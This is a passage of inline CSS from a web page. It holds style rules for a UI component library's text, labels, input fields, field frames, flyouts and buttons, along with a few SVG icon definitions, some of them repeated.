            color: var(--ux-1orzojh, var(--ux-1lpd00q, blue));
        }

        .ux-text.ux-text-feedback-highlight {
            color: var(--ux-1dmc3b7, var(--ux-cuskv8, blue));
        }

        .ux-text.ux-text-feedback-neutral {
            color: var(--ux-2xcava, var(--ux-e1mf41, blue));
        }

        .ux-text.ux-text-feedback-internal {
            color: var(--ux-114ywl0, var(--ux-1iwdp0z, blue));
        }

        .ux-text.ux-text-feedback-passive {
            color: var(--ux-t9hajc, var(--ux-1m9ys0v, gray));
        }

        .ux-text.ux-text-feedback-premium {
            color: var(--ux-1u7nbuw, var(--ux-143smq7, purple));
        }
    </style>
    <style>
        .ux-label {
            display: block;
            white-space: nowrap;
            text-overflow: ellipsis;
            overflow: hidden;
        }

        .ux-label.ux-label--internal {
            -webkit-transform-origin: top left;
            -ms-transform-origin: top left;
            transform-origin: top left;
            pointer-events: none;
            -webkit-transition: -webkit-transform .218s ease;
            -webkit-transition: transform .218s ease;
            transition: transform .218s ease;
            -webkit-transform: scale(1);
            -ms-transform: scale(1);
            transform: scale(1);
        }

        .ux-label.ux-label--floating {
            -webkit-transform: scale(.75) translateY(-50%);
            -ms-transform: scale(.75) translateY(-50%);
            transform: scale(.75) translateY(-50%);
        }

        .ux-label .ux-label-required {
            margin-inline-start: .25em;
            display: inline-block;
        }

        [dir="rtl"] .ux-label--internal {
            -webkit-transform-origin: top right;
            -ms-transform-origin: top right;
            transform-origin: top right;
            text-align: right;
        }
    </style>
    <style>
        .ux-text {
            --uxText--fontSize0: var(--ux-1a61xr7, var(--ux-vvspv2, 1rem));
            --uxText--fontSize-1: calc(var(--uxText--fontSize0) var(--ux-ol0703, /) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize-2: calc(var(--uxText--fontSize-1) var(--ux-ol0703, /) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize1: calc(var(--uxText--fontSize0) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize2: calc(var(--uxText--fontSize1) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize3: calc(var(--uxText--fontSize2) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize4: calc(var(--uxText--fontSize3) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize5: calc(var(--uxText--fontSize4) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--lineHeight: calc(var(--ux-14t1fes, var(--ux-1w31hux, 1.5)) var(--ux-1u3f284, *) var(--ux-51yj5o, 1));
            font-size: var(--uxText--fontSize0);
            line-height: var(--uxText--lineHeight);
            font-family: var(--ux-9pe28g, var(--ux-1067ph9, sans-serif));
            font-weight: var(--ux-v02jxi, var(--ux-sm2he3, 400));
            font-variation-settings: var(--ux-1dpg6l3, var(--ux-6mut96, inherit));
        }

        .ux-text.ux-text-title {
            --uxText--fontSize0: var(--ux-jg1026, var(--ux-18ime9a, 1.5rem));
            --uxText--lineHeight: var(--ux-10e88h5, var(--ux-1pw8hzd, 1.25));
            font-family: var(--ux-1q87e65, var(--ux-p4wcd9, sans-serif));
            font-weight: var(--ux-1b8kf4b, var(--ux-1a9e4a3, 700));
            font-variation-settings: var(--ux-192otyy, var(--ux-3x9eca, inherit));
        }

        .ux-text.ux-text-heading {
            --uxText--fontSize0: var(--ux-jm4jeu, var(--ux-9ic57q, 2rem));
            --uxText--lineHeight: var(--ux-1rdqzoh, var(--ux-p25s1t, 1.25));
            font-family: var(--ux-1md8q7p, var(--ux-shg991, serif));
            font-weight: var(--ux-tjjc5f, var(--ux-c539b7, 700));
            font-variation-settings: var(--ux-1yo4eb6, var(--ux-1458mfm, inherit));
        }

        .ux-text.ux-text-paragraph {
            --uxText--fontSize0: var(--ux-1i8fva8, var(--ux-1klxlj4, 1rem));
            --uxText--lineHeight: var(--ux-yu0s3r, var(--ux-mgbt9j, 1.5));
            font-family: var(--ux-1f6raab, var(--ux-117cu43, sans-serif));
            font-weight: var(--ux-27ku79, var(--ux-8n6y9x, 400));
            font-variation-settings: var(--ux-deyw5w, var(--ux-1i4pt2s, inherit));
        }

        .ux-text.ux-text-action {
            --uxText--fontSize0: var(--ux-74s1bk, var(--ux-cxbe8g, 1rem));
            --uxText--lineHeight: var(--ux-1dry2pj, var(--ux-jw5s9j, 1.5));
            font-family: var(--ux-1ir8vtv, var(--ux-gfnupv, sans-serif));
            font-weight: var(--ux-4g1r2t, var(--ux-j40yyd, 400));
            font-variation-settings: var(--ux-1xspc04, var(--ux-ndnsbo, inherit));
        }

        .ux-text.ux-text-input {
            --uxText--fontSize0: var(--ux-zkzmxk, var(--ux-oc0naw, 1rem));
            --uxText--lineHeight: var(--ux-neouyn, var(--ux-hm1ty7, 1.5));
            font-family: var(--ux-o591yj, var(--ux-9wtaa3, sans-serif));
            font-weight: var(--ux-1095x0d, var(--ux-3z6ccd, 400));
            font-variation-settings: var(--ux-j138x8, var(--ux-e727t8, inherit));
        }

        .ux-text.ux-text-label {
            --uxText--fontSize: var(--ux-1g5b33c, var(--ux-16aixzc, 1rem));
            --uxText--lineHeight: var(--ux-d7itcf, var(--ux-h93mi7, 1.5));
            font-family: var(--ux-134wucb, var(--ux-15ks663, sans-serif));
            font-weight: var(--ux-jigg19, var(--ux-aarlu5, 400));
            font-variation-settings: var(--ux-abra1o, var(--ux-1qg0ofw, inherit));
        }

        .ux-text.ux-text-caption {
            --uxText--fontSize0: var(--ux-1n2ego0, var(--ux-p4h24g, .875rem));
            --uxText--lineHeight: var(--ux-1xkykcn, var(--ux-1dje42v, 1.5));
            font-family: var(--ux-3gzsib, var(--ux-1gutwvn, sans-serif));
            font-weight: var(--ux-1dkcied, var(--ux-g9ierp, 400));
            font-variation-settings: var(--ux-1iow7o, var(--ux-tjt16c, inherit));
        }

        .ux-text.ux-text-size0 {
            font-size: var(--uxText--fontSize0);
        }

        .ux-text.ux-text-size1 {
            font-size: var(--uxText--fontSize1);
        }

        .ux-text.ux-text-size2 {
            font-size: var(--uxText--fontSize2);
        }

        .ux-text.ux-text-size3 {
            font-size: var(--uxText--fontSize3);
        }

        .ux-text.ux-text-size4 {
            font-size: var(--uxText--fontSize4);
        }

        .ux-text.ux-text-size5 {
            font-size: var(--uxText--fontSize5);
        }

        .ux-text.ux-text-size-1 {
            font-size: var(--uxText--fontSize-1);
        }

        .ux-text.ux-text-size-2 {
            font-size: var(--uxText--fontSize-2);
        }

        .ux-text.ux-text-feedback-critical {
            color: var(--ux-1k8kcmw, var(--ux-1fhc073, red));
        }

        .ux-text.ux-text-feedback-success {
            color: var(--ux-1cdj78w, var(--ux-1ep3kxj, green));
        }

        .ux-text.ux-text-feedback-warning {
            color: var(--ux-1atr6wp, var(--ux-lv1r6m, darkorange));
        }

        .ux-text.ux-text-feedback-info {
            color: var(--ux-1orzojh, var(--ux-1lpd00q, blue));
        }

        .ux-text.ux-text-feedback-highlight {
            color: var(--ux-1dmc3b7, var(--ux-cuskv8, blue));
        }

        .ux-text.ux-text-feedback-neutral {
            color: var(--ux-2xcava, var(--ux-e1mf41, blue));
        }

        .ux-text.ux-text-feedback-internal {
            color: var(--ux-114ywl0, var(--ux-1iwdp0z, blue));
        }

        .ux-text.ux-text-feedback-passive {
            color: var(--ux-t9hajc, var(--ux-1m9ys0v, gray));
        }

        .ux-text.ux-text-feedback-premium {
            color: var(--ux-1u7nbuw, var(--ux-143smq7, purple));
        }
    </style>
    <style>
        .ux-text {
            --uxText--fontSize0: var(--ux-1a61xr7, var(--ux-vvspv2, 1rem));
            --uxText--fontSize-1: calc(var(--uxText--fontSize0) var(--ux-ol0703, /) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize-2: calc(var(--uxText--fontSize-1) var(--ux-ol0703, /) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize1: calc(var(--uxText--fontSize0) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize2: calc(var(--uxText--fontSize1) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize3: calc(var(--uxText--fontSize2) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize4: calc(var(--uxText--fontSize3) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize5: calc(var(--uxText--fontSize4) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--lineHeight: calc(var(--ux-14t1fes, var(--ux-1w31hux, 1.5)) var(--ux-1u3f284, *) var(--ux-51yj5o, 1));
            font-size: var(--uxText--fontSize0);
            line-height: var(--uxText--lineHeight);
            font-family: var(--ux-9pe28g, var(--ux-1067ph9, sans-serif));
            font-weight: var(--ux-v02jxi, var(--ux-sm2he3, 400));
            font-variation-settings: var(--ux-1dpg6l3, var(--ux-6mut96, inherit));
        }

        .ux-text.ux-text-title {
            --uxText--fontSize0: var(--ux-jg1026, var(--ux-18ime9a, 1.5rem));
            --uxText--lineHeight: var(--ux-10e88h5, var(--ux-1pw8hzd, 1.25));
            font-family: var(--ux-1q87e65, var(--ux-p4wcd9, sans-serif));
            font-weight: var(--ux-1b8kf4b, var(--ux-1a9e4a3, 700));
            font-variation-settings: var(--ux-192otyy, var(--ux-3x9eca, inherit));
        }

        .ux-text.ux-text-heading {
            --uxText--fontSize0: var(--ux-jm4jeu, var(--ux-9ic57q, 2rem));
            --uxText--lineHeight: var(--ux-1rdqzoh, var(--ux-p25s1t, 1.25));
            font-family: var(--ux-1md8q7p, var(--ux-shg991, serif));
            font-weight: var(--ux-tjjc5f, var(--ux-c539b7, 700));
            font-variation-settings: var(--ux-1yo4eb6, var(--ux-1458mfm, inherit));
        }

        .ux-text.ux-text-paragraph {
            --uxText--fontSize0: var(--ux-1i8fva8, var(--ux-1klxlj4, 1rem));
            --uxText--lineHeight: var(--ux-yu0s3r, var(--ux-mgbt9j, 1.5));
            font-family: var(--ux-1f6raab, var(--ux-117cu43, sans-serif));
            font-weight: var(--ux-27ku79, var(--ux-8n6y9x, 400));
            font-variation-settings: var(--ux-deyw5w, var(--ux-1i4pt2s, inherit));
        }

        .ux-text.ux-text-action {
            --uxText--fontSize0: var(--ux-74s1bk, var(--ux-cxbe8g, 1rem));
            --uxText--lineHeight: var(--ux-1dry2pj, var(--ux-jw5s9j, 1.5));
            font-family: var(--ux-1ir8vtv, var(--ux-gfnupv, sans-serif));
            font-weight: var(--ux-4g1r2t, var(--ux-j40yyd, 400));
            font-variation-settings: var(--ux-1xspc04, var(--ux-ndnsbo, inherit));
        }

        .ux-text.ux-text-input {
            --uxText--fontSize0: var(--ux-zkzmxk, var(--ux-oc0naw, 1rem));
            --uxText--lineHeight: var(--ux-neouyn, var(--ux-hm1ty7, 1.5));
            font-family: var(--ux-o591yj, var(--ux-9wtaa3, sans-serif));
            font-weight: var(--ux-1095x0d, var(--ux-3z6ccd, 400));
            font-variation-settings: var(--ux-j138x8, var(--ux-e727t8, inherit));
        }

        .ux-text.ux-text-label {
            --uxText--fontSize: var(--ux-1g5b33c, var(--ux-16aixzc, 1rem));
            --uxText--lineHeight: var(--ux-d7itcf, var(--ux-h93mi7, 1.5));
            font-family: var(--ux-134wucb, var(--ux-15ks663, sans-serif));
            font-weight: var(--ux-jigg19, var(--ux-aarlu5, 400));
            font-variation-settings: var(--ux-abra1o, var(--ux-1qg0ofw, inherit));
        }

        .ux-text.ux-text-caption {
            --uxText--fontSize0: var(--ux-1n2ego0, var(--ux-p4h24g, .875rem));
            --uxText--lineHeight: var(--ux-1xkykcn, var(--ux-1dje42v, 1.5));
            font-family: var(--ux-3gzsib, var(--ux-1gutwvn, sans-serif));
            font-weight: var(--ux-1dkcied, var(--ux-g9ierp, 400));
            font-variation-settings: var(--ux-1iow7o, var(--ux-tjt16c, inherit));
        }

        .ux-text.ux-text-size0 {
            font-size: var(--uxText--fontSize0);
        }

        .ux-text.ux-text-size1 {
            font-size: var(--uxText--fontSize1);
        }

        .ux-text.ux-text-size2 {
            font-size: var(--uxText--fontSize2);
        }

        .ux-text.ux-text-size3 {
            font-size: var(--uxText--fontSize3);
        }

        .ux-text.ux-text-size4 {
            font-size: var(--uxText--fontSize4);
        }

        .ux-text.ux-text-size5 {
            font-size: var(--uxText--fontSize5);
        }

        .ux-text.ux-text-size-1 {
            font-size: var(--uxText--fontSize-1);
        }

        .ux-text.ux-text-size-2 {
            font-size: var(--uxText--fontSize-2);
        }

        .ux-text.ux-text-feedback-critical {
            color: var(--ux-1k8kcmw, var(--ux-1fhc073, red));
        }

        .ux-text.ux-text-feedback-success {
            color: var(--ux-1cdj78w, var(--ux-1ep3kxj, green));
        }

        .ux-text.ux-text-feedback-warning {
            color: var(--ux-1atr6wp, var(--ux-lv1r6m, darkorange));
        }

        .ux-text.ux-text-feedback-info {
            color: var(--ux-1orzojh, var(--ux-1lpd00q, blue));
        }

        .ux-text.ux-text-feedback-highlight {
            color: var(--ux-1dmc3b7, var(--ux-cuskv8, blue));
        }

        .ux-text.ux-text-feedback-neutral {
            color: var(--ux-2xcava, var(--ux-e1mf41, blue));
        }

        .ux-text.ux-text-feedback-internal {
            color: var(--ux-114ywl0, var(--ux-1iwdp0z, blue));
        }

        .ux-text.ux-text-feedback-passive {
            color: var(--ux-t9hajc, var(--ux-1m9ys0v, gray));
        }

        .ux-text.ux-text-feedback-premium {
            color: var(--ux-1u7nbuw, var(--ux-143smq7, purple));
        }
    </style>
    <style>
        .ux-label {
            display: block;
            white-space: nowrap;
            text-overflow: ellipsis;
            overflow: hidden;
        }

        .ux-label.ux-label--internal {
            -webkit-transform-origin: top left;
            -ms-transform-origin: top left;
            transform-origin: top left;
            pointer-events: none;
            -webkit-transition: -webkit-transform .218s ease;
            -webkit-transition: transform .218s ease;
            transition: transform .218s ease;
            -webkit-transform: scale(1);
            -ms-transform: scale(1);
            transform: scale(1);
        }

        .ux-label.ux-label--floating {
            -webkit-transform: scale(.75) translateY(-50%);
            -ms-transform: scale(.75) translateY(-50%);
            transform: scale(.75) translateY(-50%);
        }

        .ux-label .ux-label-required {
            margin-inline-start: .25em;
            display: inline-block;
        }

        [dir="rtl"] .ux-label--internal {
            -webkit-transform-origin: top right;
            -ms-transform-origin: top right;
            transform-origin: top right;
            text-align: right;
        }
    </style>
    <style>
        .ux-text-entry-shell {
            --uxTextEntry-padding: calc(var(--ux-1sbfig8, .25rem) * 2);
            position: relative;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            white-space: nowrap;
            text-overflow: ellipsis;
            overflow: hidden;
            padding: var(--uxTextEntry-padding);
            border: var(--uxButton--borderWidth, 2px) solid transparent;
        }

        .ux-text-entry-shell[data-size]:after {
            content: attr(data-size);
            visibility: hidden;
            white-space: pre;
        }

        .ux-text-entry-shell .ux-label~.ux-text-entry-field {
            -webkit-transform: translateY(var(--uxTextEntry-padding));
            -ms-transform: translateY(var(--uxTextEntry-padding));
            transform: translateY(var(--uxTextEntry-padding));
        }

        .ux-text-entry-field,
        .ux-text-entry-suggestion {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            position: absolute;
            height: calc(100% - (var(--uxTextEntry-padding) * 2));
            width: calc(100% - (var(--uxTextEntry-padding) * 2));
            top: 0;
            left: 0;
            font: inherit;
            color: inherit;
            text-align: revert;
            background-color: transparent;
            margin: var(--uxTextEntry-padding);
            padding: 0;
            border: 0;
        }

        .ux-text-entry-field {
            resize: none;
        }

        .ux-text-entry-field::-webkit-input-placeholder {
            color: var(--ux-1lfpuy1, var(--ux-1nk9qds, black));
            opacity: 1;
        }

        .ux-text-entry-field::-moz-placeholder {
            color: var(--ux-1lfpuy1, var(--ux-1nk9qds, black));
            opacity: 1;
        }

        .ux-text-entry-field:-ms-input-placeholder {
            color: var(--ux-1lfpuy1, var(--ux-1nk9qds, black));
            opacity: 1;
        }

        .ux-text-entry-field::placeholder {
            color: var(--ux-1lfpuy1, var(--ux-1nk9qds, black));
            opacity: 1;
        }

        .ux-text-entry-field::-webkit-search-cancel-button,
        .ux-text-entry-field::-webkit-inner-spin-button {
            display: none;
        }

        .ux-text-entry-field[type=number] {
            -moz-appearance: textfield;
        }

        .ux-text-entry-field::-ms-reveal,
        .ux-text-entry-field::-ms-clear {
            display: none;
        }

        .ux-text-entry-field:focus {
            outline: 0;
        }

        .ux-text-entry-field[disabled] {
            opacity: .4;
            cursor: not-allowed;
        }

        .ux-text-entry-field[read-only] {
            cursor: not-allowed;
        }

        .ux-text-entry-suggestion {
            white-space: nowrap;
            text-overflow: clip;
            overflow: hidden;
            opacity: .4;
        }
    </style>
    <style>
        .ux-field-frame {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            border: var(--ux-wdgt6l, var(--ux-3lhizs, 1px)) solid var(--ux-qitkg6, var(--ux-by6mab, lightgray));
            border-radius: var(--ux-73dyxv, var(--ux-1oqjeuu, 2px));
            background-color: var(--ux-1nu8itt, white);
        }

        .ux-field-frame:not(.ux-field-frame--stretch) {
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-align-self: flex-start;
            -ms-flex-item-align: start;
            align-self: flex-start;
        }

        .ux-field-frame[disabled] {
            opacity: .4;
            cursor: not-allowed;
        }

        .ux-field-frame[disabled] [disabled] {
            opacity: 1;
        }

        .ux-field-frame>hr {
            border: inherit;
            height: initial;
            border-color: var(--ux-qitkg6, var(--ux-by6mab, lightgray));
            border-top: 0;
            border-left: 0;
        }

        .ux-field-frame> :not(:first-child, .ux-flyout) {
            border-top-right-radius: 0 !important;
            border-bottom-right-radius: 0 !important;
        }

        .ux-field-frame> :not(:last-child, .ux-flyout) {
            border-top-left-radius: 0 !important;
            border-bottom-left-radius: 0 !important;
        }

        .ux-field-frame> :first-child:not(.ux-flyout) {
            border-top-left-radius: inherit !important;
            border-bottom-left-radius: inherit !important;
        }

        .ux-field-frame> :last-child:not(.ux-flyout) {
            border-top-right-radius: inherit !important;
            border-bottom-right-radius: inherit !important;
        }

        .ux-field-frame.ux-field-frame--invalid {
            border-color: var(--ux-c1nbbh, var(--ux-1fhc073, red));
        }

        .ux-field-frame[data-flyout*="top"] {
            border-top-left-radius: 0;
            border-top-right-radius: 0;
        }

        .ux-field-frame[data-flyout]>.ux-flyout[data-placement*="top"] {
            border-radius: 0;
            border-top-left-radius: var(--ux-73dyxv, var(--ux-1oqjeuu, 2px));
            border-top-right-radius: var(--ux-73dyxv, var(--ux-1oqjeuu, 2px));
            border: 0;
            border-left: inherit;
            border-right: inherit;
            border-top: inherit;
            overflow-x: hidden;
            overflow-y: auto;
        }

        .ux-field-frame[data-flyout*="bottom"] {
            border-bottom-left-radius: 0;
            border-bottom-right-radius: 0;
        }

        .ux-field-frame[data-flyout]>.ux-flyout[data-placement*="bottom"] {
            border-radius: 0;
            border-bottom-left-radius: var(--ux-73dyxv, var(--ux-1oqjeuu, 2px));
            border-bottom-right-radius: var(--ux-73dyxv, var(--ux-1oqjeuu, 2px));
            border: 0;
            border-left: inherit;
            border-right: inherit;
            border-bottom: inherit;
            overflow-x: hidden;
            overflow-y: auto;
        }
    </style>
    <style>
        .ux-flyout {
            -webkit-filter: drop-shadow(0 2px 2px rgba(128, 128, 128, 0.4));
            filter: drop-shadow(0 2px 2px rgba(128, 128, 128, 0.4));
            box-sizing: border-box;
            will-change: filter;
        }

        .ux-flyout[data-escaped] {
            opacity: 1;
            -webkit-transition: opacity 0.218s ease;
            transition: opacity 0.218s ease;
        }

        .ux-flyout[data-escaped='true'] {
            opacity: 0;
            pointer-events: none;
        }

        .ux-flyout[data-placement*='top'] {
            -webkit-transform: translateY(calc(var(--ux-flyout-arrow-size, var(--ux-1sbfig8, .25rem)) * -0.7071067811865476));
            -ms-transform: translateY(calc(var(--ux-flyout-arrow-size, var(--ux-1sbfig8, .25rem)) * -0.7071067811865476));
            transform: translateY(calc(var(--ux-flyout-arrow-size, var(--ux-1sbfig8, .25rem)) * -0.7071067811865476));
        }

        .ux-flyout[data-placement*='top'][style*="--ux-flyout-arrow"]> :first-child:after {
            -webkit-transform: rotate(45deg);
            -ms-transform: rotate(45deg);
            transform: rotate(45deg);
            top: calc(100% - var(--ux-flyout-arrow-size, 0) / 2);
        }

        .ux-flyout[data-placement*='right'] {
            -webkit-transform: translateX(calc(var(--ux-flyout-arrow-size, var(--ux-1sbfig8, .25rem)) * 0.7071067811865476));
            -ms-transform: translateX(calc(var(--ux-flyout-arrow-size, var(--ux-1sbfig8, .25rem)) * 0.7071067811865476));
            transform: translateX(calc(var(--ux-flyout-arrow-size, var(--ux-1sbfig8, .25rem)) * 0.7071067811865476));
        }

        .ux-flyout[data-placement*='right'][style*="--ux-flyout-arrow"]> :first-child:after {
            -webkit-transform: rotate(135deg);
            -ms-transform: rotate(135deg);
            transform: rotate(135deg);
            right: calc(100% - var(--ux-flyout-arrow-size, 0) / 2);
        }

        .ux-flyout[data-placement*='bottom'] {
            -webkit-transform: translateY(calc(var(--ux-flyout-arrow-size, var(--ux-1sbfig8, .25rem)) * 0.7071067811865476));
            -ms-transform: translateY(calc(var(--ux-flyout-arrow-size, var(--ux-1sbfig8, .25rem)) * 0.7071067811865476));
            transform: translateY(calc(var(--ux-flyout-arrow-size, var(--ux-1sbfig8, .25rem)) * 0.7071067811865476));
        }

        .ux-flyout[data-placement*='bottom'][style*="--ux-flyout-arrow"]> :first-child:after {
            -webkit-transform: rotate(-135deg);
            -ms-transform: rotate(-135deg);
            transform: rotate(-135deg);
            bottom: calc(100% - var(--ux-flyout-arrow-size, 0) / 2);
        }

        .ux-flyout[data-placement*='left'] {
            -webkit-transform: translateX(calc(var(--ux-flyout-arrow-size, var(--ux-1sbfig8, .25rem)) * -0.7071067811865476));
            -ms-transform: translateX(calc(var(--ux-flyout-arrow-size, var(--ux-1sbfig8, .25rem)) * -0.7071067811865476));
            transform: translateX(calc(var(--ux-flyout-arrow-size, var(--ux-1sbfig8, .25rem)) * -0.7071067811865476));
        }

        .ux-flyout[data-placement*='left'][style*="--ux-flyout-arrow"]> :first-child:after {
            -webkit-transform: rotate(-45deg);
            -ms-transform: rotate(-45deg);
            transform: rotate(-45deg);
            left: calc(100% - var(--ux-flyout-arrow-size, 0) / 2);
        }

        .ux-flyout[style*="--ux-flyout-arrow"]> :first-child:after {
            content: '';
            --ux-flyout-arrow-clip: calc(50% - 1px);
            height: var(--ux-flyout-arrow-size, 0);
            width: var(--ux-flyout-arrow-size, 0);
            left: var(--ux-flyout-arrow-left);
            top: var(--ux-flyout-arrow-top);
            position: absolute;
            background: inherit;
            border: inherit;
            box-sizing: border-box;
            -webkit-transform-origin: center center;
            -ms-transform-origin: center center;
            transform-origin: center center;
            -webkit-clip-path: polygon(var(--ux-flyout-arrow-clip) var(--ux-flyout-arrow-clip), 100% 0, 100% 100%, 0 100%);
            clip-path: polygon(var(--ux-flyout-arrow-clip) var(--ux-flyout-arrow-clip), 100% 0, 100% 100%, 0 100%);
        }

        .ux-flyout .ux-flyout-arrow-reference {
            height: var(--ux-flyout-arrow-size, 0);
            width: var(--ux-flyout-arrow-size, 0);
            position: absolute;
            visibility: hidden;
        }
    </style>
    <style>
        .ux-text-input-shell {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
        }

        .ux-text-input-shell .ux-text-caption {
            margin: calc(var(--ux-1sbfig8, .25rem) * 1) 0 0;
        }
    </style>
    <style>
        .show-hide-btn {
            position: absolute;
            top: 0;
            color: var(--ux-cuskv8, blue)
        }

        [dir=ltr] .show-hide-btn {
            right: 0
        }

        [dir=rtl] .show-hide-btn {
            left: 0
        }

        .inline-show-hide-btn {
            transform: translate(-50%, 50%)
        }
    </style>
    <style>
        .edit-cancel-btn {
            position: absolute;
            top: 0;
            color: var(--ux-cuskv8, blue)
        }

        [dir=ltr] .edit-cancel-btn {
            right: 0
        }

        [dir=rtl] .edit-cancel-btn {
            left: 0
        }
    </style>
    <style>
        * {
            --uxp-icon-gd-the-go: url("data:image/svg+xml;utf-8,<svg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 24 24%27><path d=%27M19.252 3.822c-2.079-1.31-4.815-1-7.255.55-2.433-1.55-5.171-1.86-7.247-.55-3.284 2.074-3.684 7.417-.891 11.933 2.058 3.33 5.277 5.28 8.142 5.244 2.865.036 6.083-1.914 8.142-5.244 2.788-4.516 2.393-9.859-.891-11.933zM5.368 14.802a10.87 10.87 0 01-1.288-2.983 8.611 8.611 0 01-.28-2.81c.125-1.67.797-2.969 1.892-3.661 1.095-.692 2.543-.733 4.085-.115.235.095.464.203.688.321a12.696 12.696 0 00-2.214 2.69c-1.696 2.742-2.213 5.794-1.621 8.225a11.142 11.142 0 01-1.262-1.667zm14.554-2.983a10.9 10.9 0 01-1.288 2.983c-.368.596-.79 1.155-1.262 1.67.53-2.18.17-4.85-1.127-7.356a.33.33 0 00-.206-.17.323.323 0 00-.263.04l-4.043 2.555a.331.331 0 00-.151.338.334.334 0 00.046.122l.593.959a.33.33 0 00.335.152.327.327 0 00.12-.046l2.621-1.655c.085.258.17.51.233.772.248.914.342 1.864.28 2.81-.124 1.67-.797 2.97-1.892 3.662a3.669 3.669 0 01-1.874.548h-.085a3.667 3.667 0 01-1.874-.548c-1.096-.692-1.768-1.992-1.893-3.661a8.639 8.639 0 01.28-2.811 11.145 11.145 0 013.375-5.46 8.442 8.442 0 012.374-1.487c1.537-.617 2.988-.577 4.084.115 1.096.693 1.767 1.992 1.892 3.66a8.635 8.635 0 01-.275 2.808zm-2.313 8.37v-.119c0-.004 0-.008.002-.012a.03.03 0 01.016-.017.028.028 0 01.012-.002h.75l.012.002a.028.028 0 01.01.007.03.03 0 01.008.022v.12a.029.029 0 01-.008.022.027.027 0 01-.021.009h-.275v.747a.028.028 0 01-.01.023.03.03 0 01-.02.009h-.142a.03.03 0 01-.021-.01.034.034 0 01-.009-.022v-.748h-.274a.027.027 0 01-.022-.008.029.029 0 01-.008-.023zm1.312-.122l.21.48.21-.48a.044.044 0 01.044-.027h.224c.004 0 .008 0 .012.002a.028.028 0 01.016.016.029.029 0 01.002.012v.9a.031.031 0 01-.008.021.028.028 0 01-.02.009h-.135a.03.03 0 01-.02-.009.032.032 0 01-.01-.021v-.68l-.219.494a.052.052 0 01-.017.023.048.048 0 01-.028.007h-.108a.047.047 0 01-.027-.007.052.052 0 01-.017-.023l-.22-.494v.68c0 .004 0 .008-.002.012a.03.03 0 01-.027.018h-.135a.028.028 0 01-.02-.009.032.032 0 01-.01-.021v-.9c0-.005.002-.009.003-.012a.028.028 0 01.007-.01.026.026 0 01.01-.006.028.028 0 01.01-.003h.232a.05.05 0 01.027.007.04.04 0 01.016.02z%27/></svg>");
        }

        .uxicon-gd-the-go:before {
            content: var(--uxp-icon-gd-the-go)
        }
    </style>
    <style>
        #password-frame {
            height: 50px;
            width: 100%;
            border: none;
        }
    </style>
    <style>
        .ux-text-input-shell {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
        }

        .ux-text-input-shell .ux-text-caption {
            margin: calc(var(--ux-1sbfig8, .25rem) * 1) 0 0;
        }
    </style>
    <style>
        .custom-label {
            position: inherit;
            z-index: 1
        }

        .overlay {
            background-color: #fff;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            position: absolute;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 200
        }
    </style>
    <style>
        .contextual-spinner-container {
            display: flex;
            justify-content: center;
            margin-top: 15vh;
        }

        .contextual .ux-alert.ux-alert-critical {
            margin-bottom: 24px;
        }

        .is_iframe {
            margin-top: 0 !important;
        }

        @media (min-width: 768px) {
            .contextual {
                margin-top: 10vh;
            }
        }
    </style>
    <style>
        * {
            --uxp-icon-checkmark: url("data:image/svg+xml;utf-8,<svg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 24 24%27><path d=%27M9 18.25a.748.748 0 01-.53-.22l-5-5a.75.75 0 011.06-1.06L9 16.44 19.47 5.97a.75.75 0 011.06 1.06l-11 11a.748.748 0 01-.53.22z%27/></svg>");
        }

        .uxicon-checkmark:before {
            content: var(--uxp-icon-checkmark)
        }
    </style>
    <style>
        * {
            --uxp-icon-minus: url("data:image/svg+xml;utf-8,<svg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 24 24%27><path d=%27M20 12.75H4a.75.75 0 110-1.5h16a.75.75 0 110 1.5z%27/></svg>");
        }

        .uxicon-minus:before {
            content: var(--uxp-icon-minus)
        }
    </style>
    <style>
        .ux-text {
            --uxText--fontSize0: var(--ux-1a61xr7, var(--ux-vvspv2, 1rem));
            --uxText--fontSize-1: calc(var(--uxText--fontSize0) var(--ux-ol0703, /) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize-2: calc(var(--uxText--fontSize-1) var(--ux-ol0703, /) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize1: calc(var(--uxText--fontSize0) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize2: calc(var(--uxText--fontSize1) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize3: calc(var(--uxText--fontSize2) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize4: calc(var(--uxText--fontSize3) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
